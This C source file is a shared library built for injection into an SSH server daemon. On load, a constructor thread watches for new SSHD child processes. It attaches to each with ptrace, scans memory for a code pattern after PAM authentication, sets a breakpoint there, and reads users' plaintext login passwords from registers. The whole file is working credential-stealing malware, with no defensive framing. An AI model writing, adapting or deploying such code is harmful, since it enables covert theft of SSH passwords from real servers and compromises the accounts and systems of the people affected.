#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

pid_t PID;          // pid of SSHD parent process, the one we inject
pid_t TRACEES[100]; // remember children that are being traced

void append_pid(pid_t pid)
{
    for (int i = 0; i < 100; i++) {
        if (TRACEES[i] == 0) {
            TRACEES[i] = pid;
            break;
        }
    }
}

int is_pid_traced(pid_t pid)
{
    for (int i = 0; i < 100; i++) {
        if (TRACEES[i] == pid) {
            return 1;
        }
    }
    return 0;
}

// check if file is empty
int is_file_empty(const char* path)
{
    FILE* fp = fopen(path, "r");
    int i = 0;
    char c;

    c = fgetc(fp);
    if (c == EOF) {
        fclose(fp);
        return 1;
    } else {
        ungetc(c, fp);
    }

    return 0;
}

// returns file size
int read_file(const char* path, char* dest)
{
    if (is_file_empty(path))
        return 0;
    FILE* fp = fopen(path, "r");
    int i = 0;
    char c;

    do {
        c = fgetc(fp);
        dest[i] = c;
        i++;
    } while (c != EOF && i < 128);

    return i;
}

/* msleep(): Sleep for the requested number of milliseconds. */
int msleep(long msec)
{
    struct timespec ts;
    int res;

    if (msec < 0) {
        errno = EINVAL;
        return -1;
    }

    ts.tv_sec = msec / 1000;
    ts.tv_nsec = (msec % 1000) * 1000000;

    do {
        res = nanosleep(&ts, &ts);
    } while (res && errno == EINTR);

    return res;
}

void* ssh_harvester(void* arg)
{
    pid_t pid = (long)arg;
    if (pid == 0) {
        puts("Harvester aborting due to invalid pid 0");
        pthread_exit(NULL);
    }

    char *ptr, *end;
    int i = 0;
    ptrace(PTRACE_ATTACH, pid);
    printf("[+] Started Harvester for SSHD PID %d\n", pid);

    // Open the SSHD maps file and search for the SSHD process address
    char mapsfile[32];
    snprintf(mapsfile, 32, "/proc/%d/maps", pid);
    FILE* fd = fopen(mapsfile, "r");
    char buffer[200];
    while (fgets(buffer, sizeof(buffer), fd)) {
        if (strstr(buffer, "/sshd") && strstr(buffer, "r-x")) {
            ptr = (char*)strtoull(buffer, NULL, 16);
            end = (char*)strtoull(strstr(buffer, "-") + 1, NULL, 16);
            break;
        }
    }
    fclose(fd);
    if (ptr == NULL || end == NULL) {
        puts("Unable to find SSSHD process in memory map");
        ptrace(PTRACE_DETACH, pid);
        pthread_exit(NULL);
    }
    printf("[*] SSHD process found at %p - %p\n", ptr, end);

    // search for auth_password function
    puts("[*] Searching for auth_password...");
    while (ptr < end) {
        long word = ptrace(PTRACE_PEEKTEXT, pid, (unsigned long long)ptr, NULL);

        // 0x21c0b60f08c48348 this code pattern happens after pam_auth
        // on success the password will be in RBP and RAX should be 0x1
        if (word == 0x21c0b60f08c48348) {
            printf("\n[+] Got a hit (0x%lx) at 0x%llx\n", word, (unsigned long long)ptr);
            break;
        }
        ptr++;
    }
    printf("\n\n[+] Finished Searching: ptr reached %p\n", ptr);
    if (end == ptr) {
        puts("[!] Could not find signature in SSHD process");
        ptrace(PTRACE_DETACH, pid);
        pthread_exit(NULL);
    }

    // write breakpoint
    long data = ptrace(PTRACE_PEEKTEXT, pid, ptr, 0); // original instruction
    long data_with_trap = (data & ~0xFF) | 0xCC;      // patch the first byte with 0xCC (int 3)
    printf("Patching 0x%lx to 0x%lx\n", data, data_with_trap);
    if (ptrace(PTRACE_POKETEXT, pid, (void*)ptr, data_with_trap) < 0) {
        perror("PTRACE_POKETEXT insert int3");
        pthread_exit(NULL);
    }
    puts("[+] INT 3 written, we have set a breakpoint");

    // resuming process to reach breakpoint
    if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0) {
        perror("PTRACE_CONT failed");
        ptrace(PTRACE_DETACH, pid);
        pthread_exit(NULL);
    }
    puts("[+] Resuming process to hit breakpoint");
    int wstatus;
    if (waitpid(pid, &wstatus, (WSTOPPED | WUNTRACED)) < 0)
        perror("[-] resuming process: waitpid WSTOPPED");

    // read RBP-pointed memory for password string, stop at NULL
    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    unsigned long long password_arg = (unsigned long long)regs.rbp;
    unsigned long long pam_ret = (unsigned long long)regs.rax;
    char password[100];
    char* ppass = password; // points to the tail of password
    do {
        long val;
        char* p;

        val = ptrace(PTRACE_PEEKTEXT, pid, password_arg, NULL);
        printf("Reading args of auth_pass at 0x%llx\n", password_arg);
        if (val == -1) {
            perror("[-] Failed to read password from auth_pass args");
            ptrace(PTRACE_DETACH, pid);
            pthread_exit(NULL);
        }
        password_arg += sizeof(long);

        p = (char*)&val;
        for (i = 0; i < sizeof(long); i++, p++, ppass++) {
            *ppass = *p;
            if (*p == '\0')
                break;
        }
    } while (i == sizeof(long));
    if (pam_ret != 1) {
        printf("[-] RAX = %llx, pam auth has failed, the password '%s' is invalid\n", pam_ret, password);
    } else {
        printf("\n\n[+] Password is\n\n\t%s (length: %lu)\n\n", password, strlen(password));
    }

    // continue the session
    // read breakpoint
    long ptrace_read = ptrace(PTRACE_PEEKTEXT, pid, ptr, NULL);
    printf(" - checking bp: %lx\n", ptrace_read);
    // remove breakpoint so we can single step
    if (ptrace(PTRACE_POKETEXT, pid, (void*)ptr, data) < 0) {
        perror("removing breakpoint");
    }
    regs.rip -= 1; // one byte backward, to 0xCC
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0) {
        perror("set regs");
    }
    if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) < 0) { // exec the original code
        perror("PTRACE_SINGLESTEP");
    }

    if (waitpid(pid, &wstatus, (WSTOPPED | WUNTRACED)) < 0)
        perror("waitpid WSTOPPED, SINGLESTEP");

    // breakpoint removed, check
    ptrace_read = ptrace(PTRACE_PEEKTEXT, pid, ptr, NULL);
    printf(" - removed bp: %lx\n", ptrace_read);
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0) {
        perror("PTRACE_GETREGS failed");
    }

    // check where RIP points to after SINGLESTEP
    ptrace_read = ptrace(PTRACE_PEEKTEXT, pid, (unsigned long long)regs.rip, NULL);
    printf("\n\nCheck where RIP points to after single step:\n"
           "- RIP: 0x%llx -> %lx\n"
           "- R8: 0x%llx\n"
           "- RAX: 0x%llx\n",
        regs.rip, ptrace_read, regs.r8, regs.rax);
    // put breakpoint back
    puts("[*] Adding breakpoint back");
    if (ptrace(PTRACE_POKETEXT, pid, (void*)ptr, data_with_trap) < 0) {
        perror("adding breakpoint back");
    }
    // continue
    if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0) {
        perror("PTRACE_CONT failed");
        ptrace(PTRACE_DETACH, pid);
        pthread_exit(NULL);
    }
    if (waitpid(pid, &wstatus, (WCONTINUED | WSTOPPED | WUNTRACED)) < 0) {
        perror("continuing from SINGLESTEP");
        ptrace(PTRACE_DETACH, pid);
        pthread_exit(NULL);
    }
    puts("[*] Added breakpoint back");
    // if the tracee has exited
    if (WIFEXITED(wstatus)) {
        printf("[-] SSHD session ends (pid: %d)\n", pid);
        pthread_exit(NULL);
    }

    // continue this session
    // loop
    puts("[+] SSHD continues...\n\n");
    pthread_exit(NULL);
}

// monitor children, when a child process pops up, attach to it
void* monitor(void* arg)
{
    pid_t pid;
    char *ptr, *end;
    char children_file[128];
    snprintf(children_file, 32, "/proc/%d/task/%d/children", PID, PID);
    char c;         // each char read from children
    int i = 0;      // counter
    char pids[128]; // holds /proc/pid/task/pid/children

    printf("[+] Monitoring SSHD %d\n", PID);
    while (1) {
        msleep(100);
        // reset
        for (i = 0; i < 128; i++) {
            pids[i] = 0;
        }
        int nbytes = read_file(children_file, pids);
        if (nbytes == 0) {
            continue; // file is empty, no children processes
        }

        // process pid list
        // monitor each child process for password
        char* pid_str;
        pid_str = strtok(pids, " ");
        while (pid_str != NULL) {
            pid = (pid_t)strtol(pid_str, NULL, 10);
            pid_str = strtok(NULL, " "); // next pid
            if (is_pid_traced(pid) || pid == 0) {
                msleep(100);
                continue;
            } else {
                append_pid(pid); // this child is being traced
                pthread_t tid;
                pthread_create(&tid, NULL, ssh_harvester, (void*)(long)pid);
            }
        }
    }
}

void __attribute__((constructor)) initLibrary(void)
{
    PID = getpid();
    pthread_t thread_id;
    pthread_create(&thread_id, NULL, monitor, NULL);
}

void __attribute__((destructor)) cleanUpLibrary(void) { }
